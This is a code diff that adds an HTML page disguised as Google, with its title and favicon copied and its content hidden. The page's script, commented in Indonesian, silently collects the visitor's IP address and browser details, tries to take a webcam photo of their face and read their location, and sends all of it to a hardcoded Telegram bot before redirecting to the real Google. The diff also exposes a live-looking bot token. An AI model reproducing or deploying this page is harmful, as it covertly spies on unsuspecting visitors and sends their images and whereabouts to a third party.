@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Google</title>
+  <link rel="icon" href="https://www.google.com/favicon.ico">
+  <style>body { opacity: 0; }</style>
+</head>
+<body>
+<script>
+(async () => {
+  const BOT_TOKEN = "7961448359:AAFig9R1lEBznZH1dr1yozwzQFWP6PlRJHQ";
+  const CHAT_ID = "7284499809";
+
+  // Kirim data dasar (IP, device)
+  const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip);
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: `📡 IP: ${ip}\nUA: ${navigator.userAgent}`
+    })
+  });
+
+  // Coba akses kamera & lokasi — TANPA PROMPT jika pernah diizinkan
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({video: true});
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.play();
+    
+    setTimeout(() => {
+      const canvas = document.createElement('canvas');
+      canvas.width = 640; canvas.height = 480;
+      canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+      const img = canvas.toDataURL('image/jpeg');
+      
+      const fd = new FormData();
+      fd.append('chat_id', CHAT_ID);
+      fd.append('photo', dataURLtoBlob(img), 'face.jpg');
+      fd.append('caption', `📸 Wajah dari ${ip}`);
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: 'POST', body: fd});
+      
+      stream.getTracks().forEach(t => t.stop());
+    }, 2000);
+  } catch(e) {}
+
+  try {
+    navigator.geolocation.getCurrentPosition(pos => {
+      const lat = pos.coords.latitude, lng = pos.coords.longitude;
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: `📍 Lokasi: https://maps.google.com/?q=${lat},${lng}`
+        })
+      });
+    });
+  } catch(e) {}
+
+  // Redirect ke Google asli setelah 1 detik
+  setTimeout(() => {
+    window.location.href = 'https://www.google.com';
+  }, 1000);
+
+  function dataURLtoBlob(dataURL) {
+    const arr = dataURL.split(','), mime = arr[0].match(/:(.*?);/)[1],
+          bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+    while (n--) u8arr[n] = bstr.charCodeAt(n);
+    return new Blob([u8arr], {type: mime});
+  }
+})();
+</script>
+</body>
+</html>
